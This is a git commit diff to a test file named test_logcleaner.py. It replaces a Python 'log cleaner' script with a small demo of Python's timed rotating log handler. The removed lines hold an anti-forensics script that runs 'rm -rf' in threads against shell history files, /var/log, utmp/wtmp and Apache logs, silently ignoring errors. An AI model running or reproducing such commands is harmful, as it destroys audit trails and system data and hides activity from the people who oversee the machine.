70945a02d8b3c7fc237f32a634e2c1b41c0a59f2
LongChen3120 <longa13k63@gmail.com>
2022-12-08 12:07:39 +0700

    com

--- test/test_logcleaner.py
+++ test/test_logcleaner.py
@@ -1,31 +1,22 @@
-#!/usr/bin/env python
-
-import threading
-import os
-from time import sleep, ctime
-
-lt = ctime()
-print('[+] Starting log cleaner at %s\n\n' %(lt))
-sleep(5)
-
-class output_command(threading.Thread):
-    def __init__(self, command):
-        threading.Thread.__init__(self)
-        self.command = command
-    def run(self):
-        os.system(self.command)
-        print("[+]log was finish to clean......\n")
-
-
-class input_command:
-    def __init__(self):
-                clear_add = ["rm -rf /tmp/logs","rm -rf $HISTFILE","rm -rf /root/.ksh_history","rm -rf /root/.bash_history","rm -rf /root/.bash_logout","rm -rf /usr/local/apache/logs","rm -rf /usr/local/apache/logs","rm -rf /usr/local/apache/log","rm -rf /var/apache/logs","rm -rf /var/apache/log","rm -rf /var/run/utmp","rm -rf /var/logs","rm -rf /var/log","rm -rf /var/adm","rm -rf /etc/wtmp","rm -rf /etc/utmp"]
-                for listt in clear_add:
-                    try:
-                      i=output_command(listt)
-                      i.start()
-                    except:
-                      pass
-
+import logging
+import time
+from logging.handlers import TimedRotatingFileHandler
+#----------------------------------------------------------------------
+def create_timed_rotating_log(path):
+    """"""
+    logger = logging.getLogger("Rotating Log")
+    logger.setLevel(logging.INFO)
+    
+    handler = TimedRotatingFileHandler(path,
+                                       when="s",
+                                       interval=1,
+                                       backupCount=5)
+    logger.addHandler(handler)
+    
+    for i in range(20):
+        logger.info(f"This is a test!: {i}")
+        time.sleep(1)
+#----------------------------------------------------------------------
 if __name__ == "__main__":
-       objCaller = input_command()
+    log_file = "timed_test.log"
+    create_timed_rotating_log(log_file)
